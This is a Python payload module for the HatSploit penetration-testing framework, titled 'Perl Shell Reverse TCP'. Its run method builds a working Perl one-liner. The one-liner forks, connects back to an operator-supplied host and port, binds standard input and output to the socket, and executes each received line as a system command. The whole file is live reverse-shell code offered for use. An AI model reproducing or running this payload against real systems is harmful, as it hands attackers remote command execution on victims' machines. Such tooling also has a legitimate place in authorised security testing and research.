#!/usr/bin/env python3

#
# This payload requires HatSploit: https://hatsploit.netlify.app
# Current source: https://github.com/EntySec/HatSploit
#

from hatsploit.lib.payload import Payload


class HatSploitPayload(Payload):
    details = {
        'Category': "single",
        'Name': "Perl Shell Reverse TCP",
        'Payload': "unix/generic/perl_reverse_tcp",
        'Authors': [
            'Ivan Nikolsky (enty8080) - payload developer'
        ],
        'Description': "Perl shell reverse TCP payload.",
        'Architecture': "generic",
        'Platform': "unix",
        'Rank': "high",
        'Type': "reverse_tcp"
    }

    def run(self):
        connback_host, connback_port = self.parse_options(self.options)
        connback_data = connback_host + ':' + connback_port

        payload = "perl -MIO -e '$p=fork;exit,if($p);foreach my $key(keys %ENV){if($ENV{$key}=~/(.*)/){$ENV{$key}=$1;}}$c=new IO::Socket::INET(PeerAddr,\"LOCAL_DATA\");STDIN->fdopen($c,r);$~->fdopen($c,w);while(<>){if($_=~ /(.*)/){system $1;}};'"
        payload = payload.replace("LOCAL_DATA", connback_data)

        return payload
